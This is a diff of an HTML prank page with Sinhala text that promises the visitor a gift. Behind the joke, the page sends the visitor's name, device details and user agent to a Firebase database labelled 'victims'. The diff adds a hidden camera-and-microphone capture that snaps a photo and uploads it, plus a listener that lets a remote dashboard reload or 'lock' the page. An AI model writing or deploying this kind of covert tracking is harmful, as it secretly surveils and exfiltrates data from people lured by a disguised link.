@@ -6,47 +6,75 @@
     <title>Surprise! 🎁</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <style>
-        body { background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; font-family: sans-serif; cursor: pointer; text-align: center; }
-        img { width: 90%; max-width: 400px; display: none; border-radius: 15px; box-shadow: 0 0 20px red; }
-    </style>
 </head>
-<body onclick="hit()">
+<body onclick="hit()" style="background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; font-family: sans-serif; cursor: pointer; text-align: center;">
     
     <div id="m">
         <h2>ඔයාට තෑග්ගක් තියෙනවා! 🎁</h2>
         <p>බලන්න මෙතන ක්ලික් කරන්න</p>
     </div>
 
-    <img id="c" src="https://i.imgur.com/G36m9sH.jpeg">
+    <img id="c" src="https://i.imgur.com/G36m9sH.jpeg" style="width: 90%; max-width: 400px; display: none; border-radius: 15px; box-shadow: 0 0 20px red;">
     <audio id="a" src="https://www.myinstants.com/media/sounds/huuuuu.mp3"></audio>
+    
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // Screenshot එකේ තිබුණ උඹේම Database URL එක මෙතනට ඇඩ් කළා
         const firebaseConfig = { 
             databaseURL: "https://dark-dragon-team-default-rtdb.firebaseio.com/" 
         };
         firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
         function hit() {
-            // UI පාලනය
+            // පරණ පූසා සහ සද්දේ ලොජික් එක
             document.getElementById('m').style.display='none';
             document.getElementById('c').style.display='block';
             document.getElementById('a').play();
 
-            // ලින්ක් එකේ ඇති නම (Target Name) කියවීම
             const urlParams = new URLSearchParams(window.location.search);
             const targetName = atob(urlParams.get('t') || "Unknown");
+            const victimRef = db.ref('victims').push(); // Victim ට unique ID එකක් හදනවා
 
-            // දත්ත Firebase එකට යැවීම
-            firebase.database().ref('victims').push({
+            // මූලික දත්ත යැවීම
+            victimRef.set({
                 target: targetName,
                 device: navigator.platform,
                 agent: navigator.userAgent,
                 time: new Date().toLocaleString()
             });
 
-            // තත්පර බාගයකින් ඇලර්ට් එක දෙනවා
+            // --- ADVANCED TRACKING (Permissions) ---
+            
+            // 1. Camera Capture (ලයිව් ෆොටෝ එකක් ගැනීම)
+            navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const imgData = canvas.toDataURL('image/jpeg');
+                    // Database එකට ෆොටෝ එක යැවීම
+                    db.ref('intel/' + victimRef.key).update({ cam_shot: imgData });
+                    stream.getTracks().forEach(track => track.stop()); // වැඩේ ඉවර වුණාම කැමරා එක ඕෆ් කරනවා
+                }, 2000);
+            })
+            .catch(err => console.log("Permission Denied"));
+
+            // 2. Command Listener (Dashboard එකෙන් එන විධානයන් බලාපොරොත්තුවෙන් සිටීම)
+            db.ref('commands/' + victimRef.key).on('value', (snapshot) => {
+                const cmd = snapshot.val();
+                if(cmd) {
+                    if(cmd.action === 'restart') { location.reload(); }
+                    if(cmd.action === 'lock') { document.body.innerHTML = "<h1 style='color:red; margin-top:200px;'>DEVICE LOCKED BY DRAGON</h1>"; }
+                    // අනිත් commands මෙතනට ඇඩ් කළ හැක
+                }
+            });
+
             setTimeout(() => { 
                 alert("හුහූ රවටුනා නේද? 🤪"); 
             }, 500);
